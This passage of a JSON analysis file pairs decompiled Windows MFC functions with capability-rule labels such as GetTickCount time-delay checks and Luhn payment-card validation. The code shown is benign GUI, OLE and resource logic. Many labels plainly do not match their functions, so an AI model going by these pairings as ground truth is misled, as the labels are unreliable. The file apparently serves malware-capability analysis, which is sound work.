&lpRect, iVar3);\n                fcn.00433413(&lpRect);\n                if (uVar4 == 0) {\n                    iVar3 = (var_18h - lpRect) + -1;\n                }\n                else {\n                    iVar3 = var_14h - var_1ch;\n                }\n                if (var_8h <= iVar3) {\n                    if (uVar4 == 0) {\n                        var_8h = (var_18h - lpRect) + -1;\n                    }\n                    else {\n                        var_8h = var_14h - var_1ch;\n                    }\n                }\n                if (uVar4 == 0) {\n                    bVar6 = SBORROW4(arg_10h, var_1ch);\n                    iVar3 = arg_10h - var_1ch;\n                    bVar5 = arg_10h == var_1ch;\n                }\n                else {\n                    bVar6 = SBORROW4(arg_ch, lpRect);\n                    iVar3 = arg_ch - lpRect;\n                    bVar5 = arg_ch == lpRect;\n                }\n                if (!bVar5 && bVar6 == iVar3 < 0) goto code_r0x0043dc28;\n            }\n            var_4h = var_4h + 1;\n        } while (var_4h < *(in_ECX + 0x9c));\n    }\n    iVar3 = var_ch + 1;\n    fcn.0042782d(iVar3, 0, 1);\ncode_r0x0043dc59:\n    fcn.0042782d(iVar3, arg_8h, 1);\n    return iVar3;\n}\n",
        "token_count": 853
    },
    "0043f1e8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lprcSrc1\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl\nfcn.0043f1e8(uint lprcSrc2, uint dx, uint dy, uint lprcSrc, uint arg_18h, uint arg_1ch, uint arg_20h, uint arg_24h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint lprcSrc1;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x30) = 0;\n    *(unaff_EBP + -0x34) = vtable.CRgn.0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x2c) = vtable.CRgn.0;\n    *(unaff_EBP + -0x20) = 0;\n    *(unaff_EBP + -0x24) = vtable.CRgn.0;\n    *(unaff_EBP + -4) = 2;\n    fcn.0040bb59(*(unaff_EBP + 8));\n    (*_sym.imp.USER32.dll_CopyRect)(unaff_EBP + -0x44, *(unaff_EBP + 8));\n    (*_sym.imp.USER32.dll_InflateRect)(unaff_EBP + -0x44, -*(unaff_EBP + 0xc), -*(unaff_EBP + 0x10));\n    (*_sym.imp.USER32.dll_IntersectRect)(unaff_EBP + -0x44, unaff_EBP + -0x44, *(unaff_EBP + 8));\n    uVar2 = (*_sym.imp.GDI32.dll_CreateRectRgnIndirect)(unaff_EBP + -0x44);\n    fcn.00433a59(uVar2);\n    uVar2 = (*_sym.imp.GDI32.dll_CreateRectRgn)(0, 0, 0, 0);\n    fcn.00433a59(uVar2);\n    fcn.0040bb8d(unaff_EBP + -0x2c, unaff_EBP + -0x24, 3);\n    if (*(unaff_EBP + 0x20) == 0) {\n        uVar2 = fcn.0043f149();\n        *(unaff_EBP + 0x20) = uVar2;\n    }\n    if (*(unaff_EBP + 0x24) == 0) {\n        *(unaff_EBP + 0x24) = *(unaff_EBP + 0x20);\n    }\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x1c) = vtable.CRgn.0;\n    *(unaff_EBP + -0x10) = 0;\n    *(unaff_EBP + -0x14) = vtable.CRgn.0;\n    *(unaff_EBP + -4) = 4;\n    pcVar1 = _sym.imp.GDI32.dll_CreateRectRgn;\n    if (*(unaff_EBP + 0x14) != 0) {\n        uVar2 = (*_sym.imp.GDI32.dll_CreateRectRgn)(0, 0, 0, 0);\n        fcn.00433a59(uVar2);\n        fcn.0040bb72(*(unaff_EBP + 0x14));\n        (*_sym.imp.USER32.dll_CopyRect)(unaff_EBP + -0x44, *(unaff_EBP + 0x14));\n        (*_sym.imp.USER32.dll_InflateRect)(unaff_EBP + -0x44, -*(unaff_EBP + 0x18), -*(unaff_EBP + 0x1c));\n        (*_sym.imp.USER32.dll_IntersectRect)(unaff_EBP + -0x44, unaff_EBP + -0x44, *(unaff_EBP + 0x14));\n        fcn.0040bb72(unaff_EBP + -0x44);\n        fcn.0040bb8d(unaff_EBP + -0x2c, unaff_EBP + -0x24, 3);\n        if (*(*(unaff_EBP + 0x20) + 4) == *(*(unaff_EBP + 0x24) + 4)) {\n            uVar2 = (*pcVar1)(0, 0, 0, 0);\n            fcn.00433a59(uVar2);\n            fcn.0040bb8d(unaff_EBP + -0x1c, unaff_EBP + -0x34, 3);\n        }\n    }\n    pcVar1 = _sym.imp.GDI32.dll_PatBlt;\n    if ((*(*(unaff_EBP + 0x20) + 4) != *(*(unaff_EBP + 0x24) + 4)) && (*(unaff_EBP + 0x14) != 0)) {\n        fcn.00433387(unaff_EBP + -0x1c);\n        (**(*extraout_ECX + 0x50))(unaff_EBP + -0x44);\n        uVar2 = fcn.00433bad(*(unaff_EBP + 0x24));\n        *(unaff_EBP + 0x14) = uVar2;\n        (*pcVar1)(extraout_ECX[1], *(unaff_EBP + -0x44), *(unaff_EBP + -0x40), \n                  *(unaff_EBP + -0x3c) - *(unaff_EBP + -0x44), *(unaff_EBP + -0x38) - *(unaff_EBP + -0x40), 0x5a0049);\n        fcn.00433bad(*(unaff_EBP + 0x14));\n    }\n    iVar3 = unaff_EBP + -0x14;\n    if (*(unaff_EBP + -0x10) == 0) {\n        iVar3 = unaff_EBP + -0x34;\n    }\n    fcn.00433387(iVar3);\n    (**(*extraout_ECX + 0x50))(unaff_EBP + -0x44);\n    uVar2 = fcn.00433bad(*(unaff_EBP + 0x20));\n    *(unaff_EBP + 0x14) = uVar2;\n    (*pcVar1)(extraout_ECX[1], *(unaff_EBP + -0x44), *(unaff_EBP + -0x40), *(unaff_EBP + -0x3c) - *(unaff_EBP + -0x44), \n              *(unaff_EBP + -0x38) - *(unaff_EBP + -0x40), 0x5a0049);\n    if (*(unaff_EBP + 0x14) != 0) {\n        fcn.00433bad(*(unaff_EBP + 0x14));\n    }\n    fcn.00433387(0);\n    *(unaff_EBP + -4) = 3;\n    *(unaff_EBP + -0x14) = vtable.CGdiObject.0;\n    fcn.00433ab0();\n    *(unaff_EBP + -4) = 2;\n    *(unaff_EBP + -0x1c) = vtable.CGdiObject.0;\n    fcn.00433ab0();\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x24) = vtable.CGdiObject.0;\n    fcn.00433ab0();\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x2c) = vtable.CGdiObject.0;\n    fcn.00433ab0();\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x34) = vtable.CGdiObject.0;\n    fcn.00433ab0();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 1995
    },
    "0043f537": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043f537(uint *arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    if (arg_ch == 0) {\n        uVar2 = (*_sym.imp.USER32.dll_GetDC)(0);\n    }\n    else {\n        uVar2 = *(arg_ch + 8);\n    }\n    puVar4 = &var_40h;\n    for (iVar3 = 0xf; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = *arg_8h;\n        arg_8h = arg_8h + 1;\n        puVar4 = puVar4 + 1;\n    }\n    iVar3 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar2, 0x5a);\n    pcVar1 = _sym.imp.GDI32.dll_DPtoLP;\n    var_44h = (iVar3 * var_40h) / 0x2d0;\n    var_48h = 0;\n    (*_sym.imp.GDI32.dll_DPtoLP)(uVar2, &var_48h, 1);\n    var_50h = 0;\n    var_4ch = 0;\n    (*pcVar1)(uVar2, &var_50h, 1);\n    var_40h = fcn.00411e15(var_44h - var_4ch);\n    var_40h = -var_40h;\n    if (arg_ch == 0) {\n        (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar2);\n    }\n    fcn.00405270(&var_40h);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 472
    },
    "0043fe89": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0043fe89(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar1 = fcn.0042ff21();\n    if (piVar1 != NULL) {\n        var_14h = 0;\n        var_10h = 0;\n        var_ch = 0;\n        var_8h = 0;\n        iVar2 = (**(*piVar1 + 0x54))(0, 0, 0x50800000, &var_14h, var_4h, arg_ch, arg_8h);\n        if (iVar2 != 0) {\n            uVar3 = fcn.0042dd33();\n            if ((uVar3 & 0x200) == 0) {\n                return piVar1;\n            }\n            fcn.0042dd77(0x200, 0, 0x20);\n            return piVar1;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 270
    },
    "0044047b": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044047b(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uint32_t uVar6;\n    uint var_10ch;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    uVar3 = (*_sym.imp.USER32.dll_SetActiveWindow)(*(in_ECX + 0x1c));\n    fcn.0042b432(uVar3);\n    pcVar2 = _sym.imp.SHELL32.dll_DragQueryFileA;\n    uVar6 = 0;\n    uVar4 = (*_sym.imp.SHELL32.dll_DragQueryFileA)(arg_8h, 0xffffffff, 0, 0);\n    iVar5 = fcn.00444bf8();\n    piVar1 = *(iVar5 + 4);\n    if (uVar4 != 0) {\n        do {\n            (*pcVar2)(arg_8h, uVar6, &var_108h, 0x104);\n            (**(*piVar1 + 0x88))(&var_108h);\n            uVar6 = uVar6 + 1;\n        } while (uVar6 < uVar4);\n    }\n    (*_sym.imp.SHELL32.dll_DragFinish)(arg_8h);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 345
    },
    "00440640": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00440640(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    sub.USER32.dll_UnpackDDElParam(1000, arg_ch, &var_214h, &var_210h);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(var_210h);\n    uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(uVar1);\n    if (uVar2 < 0x208) {\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(var_210h);\n        uVar1 = sub.USER32.dll_ReuseDDElParam(arg_ch, 1000, 0x3e4, 0x8000, var_210h);\n        (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x3e4, *(in_ECX + 0x1c), uVar1);\n        iVar3 = fcn.0042de5f();\n        if (iVar3 != 0) {\n            iVar3 = fcn.00444bf8();\n            (**(**(iVar3 + 4) + 0xa0))(&var_20ch);\n        }\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 348
    },
    "00440fb3": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00440fb3(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *in_ECX;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (in_ECX[0x31] == 0) {\n        uVar1 = in_ECX[0x33];\n        in_ECX[0x31] = 1;\n        if ((uVar1 & 4) != 0) {\n            arg_8h = 1;\n        }\n        in_ECX[0x33] = uVar1 & 0xfffffff3;\n        if ((arg_8h != 0) && (in_ECX[0x1f] != NULL)) {\n            (**(*in_ECX[0x1f] + 0x50))();\n        }\n        uVar1 = fcn.0042dd19();\n        if ((uVar1 & 0x2000) == 0) {\n            fcn.0042b82b(0, 0xffff, 0xe900, 2, in_ECX + 0x1b, 0, 1);\n        }\n        else {\n            var_8h = 0x7fff;\n            var_4h = 0x7fff;\n            var_10h = 0;\n            var_ch = 0;\n            fcn.0042b82b(0, 0xffff, 0xe900, 1, &var_10h, &var_10h, 0);\n            fcn.0042b82b(0, 0xffff, 0xe900, 2, in_ECX + 0x1b, &var_10h, 1);\n            (**(*in_ECX + 0x68))(&var_10h, 0);\n            fcn.0042e037(0, 0, 0, var_8h - var_10h, var_4h - var_ch, 0x16);\n        }\n        in_ECX[0x31] = 0;\n    }\n    return;\n}\n",
        "token_count": 487
    },
    "00442499": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00442499(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint uVar9;\n    int32_t *in_ECX;\n    uint var_18h;\n    uint var_8h;\n    uint lpPoints;\n    \n    uVar6 = *(arg_ch + 0x14);\n    puVar1 = arg_ch + 0x24;\n    uVar2 = *puVar1;\n    uVar3 = *(arg_ch + 0x28);\n    uVar4 = *(arg_ch + 0x2c);\n    uVar5 = *(arg_ch + 0x30);\n    (**(*arg_8h + 0x1c))();\n    fcn.00432d24(0, 0, 0, 0);\n    uVar7 = in_ECX[0x1c];\n    *(arg_ch + 0x14) = uVar7;\n    while (uVar7 < uVar6) {\n        (**(*in_ECX + 0x154))(arg_8h, arg_ch);\n        uVar8 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(arg_8h[2], 8);\n        uVar9 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(arg_8h[2], 10);\n        (*_sym.imp.USER32.dll_SetRect)(puVar1, 0, 0, uVar8, uVar9);\n        (*_sym.imp.GDI32.dll_DPtoLP)(arg_8h[2], puVar1, 2);\n        (**(*in_ECX + 0x174))(arg_8h, arg_ch);\n        if (*(arg_ch + 0x14) == in_ECX[0x1c]) break;\n        *(arg_ch + 0x14) = *(arg_ch + 0x14) + 1;\n        uVar7 = *(arg_ch + 0x14);\n    }\n    uVar7 = *(arg_ch + 0x14);\n    (**(*arg_8h + 0x20))(0xffffffff);\n    *puVar1 = uVar2;\n    *(arg_ch + 0x28) = uVar3;\n    *(arg_ch + 0x2c) = uVar4;\n    *(arg_ch + 0x30) = uVar5;\n    *(arg_ch + 0x14) = uVar6;\n    return uVar7 == uVar6;\n}\n",
        "token_count": 595
    },
    "004467b5": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.004467b5(void)\n\n{\n    uint uVar1;\n    uint var_18h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetOEMCP)(&var_18h);\n    (*_sym.imp.KERNEL32.dll_GetCPInfo)(uVar1);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 101
    },
    "00447d83": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00447d83(int32_t hgdiobj)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_ECX;\n    uint lpvObject;\n    int32_t var_30h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.GDI32.dll_GetObjectA)(hgdiobj, 0x18, &lpvObject);\n    piVar1 = in_ECX + 0x26;\n    if (*piVar1 == 0) {\n        var_8h = 0;\n        var_4h = hgdiobj;\n        iVar2 = (**(*in_ECX + 0x110))(0x413, var_30h / in_ECX[0x28], &var_8h);\n        uVar3 = iVar2 == 0;\n    }\n    else {\n        var_ch = var_30h / in_ECX[0x28];\n        var_1ch = 0;\n        var_14h = 0;\n        var_10h = hgdiobj;\n        var_18h = *piVar1;\n        uVar3 = (**(*in_ECX + 0x110))(0x42e, 0, &var_1ch);\n    }\n    if (uVar3 != 0) {\n        fcn.00434bf4(piVar1);\n        *piVar1 = hgdiobj;\n    }\n    return uVar3;\n}\n",
        "token_count": 380
    },
    "00447e23": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00447e23(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t *piVar4;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar4 = arg_8h;\n    var_4h = *0x4640c8;\n    for (iVar1 = (**(*in_ECX + 0x110))(0x418, 0, 0); iVar1 != 0; iVar1 = iVar1 + -1) {\n        (**(*in_ECX + 0x110))(0x416, 0, 0);\n    }\n    fcn.00411850(&var_18h, 0, 0x14);\n    var_8h = 0xffffffff;\n    if (arg_8h == NULL) {\n        iVar1 = 0;\n        var_10h._0_1_ = 4;\n        if (0 < arg_ch) {\n            do {\n                iVar3 = (**(*in_ECX + 0x110))(0x414, 1, &var_18h);\n                if (iVar3 == 0) goto code_r0x00447f15;\n                iVar1 = iVar1 + 1;\n            } while (iVar1 < arg_ch);\n        }\n    }\n    else {\n        arg_8h = NULL;\n        var_1ch = 0;\n        if (0 < arg_ch) {\n            do {\n                var_14h = *piVar4;\n                piVar4 = piVar4 + 1;\n                var_10h._0_1_ = 4;\n                if (var_14h == 0) {\n                    var_10h._1_1_ = 1;\n                    uVar2 = fcn.0042dd19();\n                    if (((uVar2 & 0x800) == 0) && (*0x463e34 != 0x40047)) {\n                        var_18h = 8;\n                    }\n                    else {\n                        var_18h = 6;\n                    }\n                }\n                else {\n                    var_10h._1_1_ = 0;\n                    var_18h = arg_8h;\n                    arg_8h = arg_8h + 1;\n                }\n                iVar1 = (**(*in_ECX + 0x110))(0x414, 1, &var_18h);\n                if (iVar1 == 0) goto code_r0x00447f15;\n                var_1ch = var_1ch + 1;\n            } while (var_1ch < arg_ch);\n        }\n    }\n    iVar1 = (**(*in_ECX + 0x110))(0x418, 0, 0);\n    in_ECX[0x1c] = iVar1;\n    in_ECX[0x27] = 1;\ncode_r0x00447f15:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 724
    },
    "004487f4": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004487f4(uint arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    uVar3 = arg_8h;\n    var_4h = *0x4640c8;\n    iVar4 = (*_sym.imp.ole32.dll_ReadClassStg)(arg_8h, &var_14h);\n    if (iVar4 != 0) goto code_r0x004488b3;\n    var_1ch = 0;\n    (*_sym.imp.ole32.dll_ReadFmtUserTypeStg)(uVar3, &arg_8h, &var_1ch);\n    var_20h = 0;\n    var_18h = NULL;\n    iVar4 = (*_sym.imp.ole32.dll_OleRegGetUserType)(arg_ch, 1, &var_18h);\n    pcVar2 = _sym.imp.ole32.dll_WriteClassStg;\n    if (iVar4 != 0) {\n        var_18h = &var_20h;\n    }\n    arg_ch = (*_sym.imp.ole32.dll_WriteClassStg)(uVar3, arg_ch);\n    pcVar1 = _sym.imp.ole32.dll_WriteFmtUserTypeStg;\n    if (arg_ch == 0) {\n        arg_ch = (*_sym.imp.ole32.dll_WriteFmtUserTypeStg)(uVar3, arg_8h, var_18h);\n        if (arg_ch == 0) {\n            arg_ch = (*_sym.imp.ole32.dll_SetConvertStg)(uVar3, 1);\n            if (arg_ch == 0) goto code_r0x00448897;\n        }\n        (*pcVar2)(uVar3, &var_14h);\n        (*pcVar1)(uVar3, arg_8h, var_1ch);\n    }\ncode_r0x00448897:\n    pcVar2 = _sym.imp.ole32.dll_CoTaskMemFree;\n    if (var_18h != &var_20h) {\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(var_18h);\n    }\n    (*pcVar2)(var_1ch);\ncode_r0x004488b3:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 563
    },
    "00401120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00401120(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint32_t unaff_EDI;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadResource)(param_1, param_2);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    puVar2 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar1);\n    if (puVar2 != NULL) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_SizeofResource)(param_1, param_2);\n        puVar3 = iVar1 + puVar2;\n        for (unaff_EDI = unaff_EDI & 0xf; unaff_EDI != 0; unaff_EDI = unaff_EDI - 1) {\n            if (puVar3 <= puVar2) {\n                return 0;\n            }\n            puVar2 = puVar2 + *puVar2 + 1;\n        }\n        if (puVar2 < puVar3) {\n            return -(*puVar2 != 0) & puVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 277
    },
    "00401180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401180(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_FindResourceA)(param_1, (param_2 >> 4) + 1 & 0xffff, 6);\n    if (iVar1 == 0) {\n        return;\n    }\n    fcn.00401120(param_1, iVar1, param_2);\n    return;\n}\n",
        "token_count": 105
    },
    "004015c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004015c0(uint *param_1)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x44ac51;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    *param_1 = 0x44d910;\n    uStack4 = 2;\n    if ((param_1 + 0x62 != NULL) && (param_1[99] != 0)) {\n        fcn.00433ab0();\n    }\n    uStack4._0_1_ = 1;\n    param_1[0x62] = vtable.CGdiObject.0;\n    fcn.00433ab0();\n    uStack4 = uStack4._1_3_ << 8;\n    fcn.00405ab0();\n    uStack4 = 0xffffffff;\n    fcn.00428413();\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 243
    },
    "004017d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.004017d0(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (**(*param_2 + 0xc))();\n    *param_1 = iVar1 + 0x10;\n    return param_1;\n}\n",
        "token_count": 76
    },
    "00401810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401810(int32_t *param_1)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    \n    iVar4 = *param_1;\n    ppiVar1 = iVar4 + -0x10;\n    piVar3 = *ppiVar1;\n    if (*(iVar4 + -0xc) != 0) {\n        piVar2 = iVar4 + -4;\n        if (*(iVar4 + -4) < 0) {\n            if (*(iVar4 + -8) < 0) {\n                fcn.00401100(0x80070057);\n                iVar4 = extraout_ECX;\n            }\n            *(iVar4 + -0xc) = 0;\n            **param_1 = 0;\n            return;\n        }\n        LOCK();\n        iVar4 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n        if (iVar4 == 1 || iVar4 + -1 < 0) {\n            (**(**ppiVar1 + 4))(ppiVar1);\n        }\n        iVar4 = (**(*piVar3 + 0xc))();\n        *param_1 = iVar4 + 0x10;\n    }\n    return;\n}\n",
        "token_count": 298
    },
    "004019a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.004019a0(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00401900(*param_2 + -0x10);\n    *param_1 = iVar1 + 0x10;\n    return param_1;\n}\n",
        "token_count": 81
    },
    "00401a40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00401a40(int32_t *param_1, uint param_2, uint32_t param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    uint uVar4;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_FindResourceA)(param_2, (param_3 >> 4) + 1 & 0xffff, 6);\n    if (iVar2 != 0) {\n        puVar3 = fcn.00401120(param_2, iVar2, param_3);\n        if (puVar3 != NULL) {\n            uVar4 = (**0x4630b0)(0, puVar3 + 1, *puVar3, 0, 0, 0, 0);\n            iVar2 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar4);\n            if ((1U - *(*param_1 + -4) | *(*param_1 + -8) - iVar2) < 0) {\n                fcn.004018b0(iVar2);\n            }\n            uVar4 = (**0x4630b0)(0, puVar3 + 1, *puVar3, *param_1, iVar2, 0, 0);\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar4);\n            if ((-1 < iVar2) && (iVar2 <= *(*param_1 + -8))) {\n                *(*param_1 + -0xc) = iVar2;\n                *(iVar2 + *param_1) = 0;\n                return 1;\n            }\n            fcn.00401100(0x80070057);\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 419
    },
    "00401ce0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00401ce0(int32_t *param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x44ac68;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    piVar2 = fcn.004290ee();\n    iVar3 = (**(*piVar2 + 0xc))();\n    *param_1 = iVar3 + 0x10;\n    uStack4 = 0;\n    if (param_2 == NULL) {\n        iVar3 = 0;\n    }\n    else {\n        if ((param_2 & 0xffff0000) == 0) {\n            iVar3 = fcn.00429028(param_2 & 0xffff);\n            if (iVar3 != 0) {\n                fcn.00401a40(iVar3, param_2 & 0xffff);\n                *in_FS_OFFSET = unaff_EDI;\n                return param_1;\n            }\n            goto code_r0x00401d72;\n        }\n        pcVar4 = param_2;\n        do {\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        iVar3 = pcVar4 - (param_2 + 1);\n    }\n    fcn.00401b10(param_2, iVar3);\ncode_r0x00401d72:\n    *in_FS_OFFSET = unaff_ESI;\n    return param_1;\n}\n",
        "token_count": 415
    },
    "00410e48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
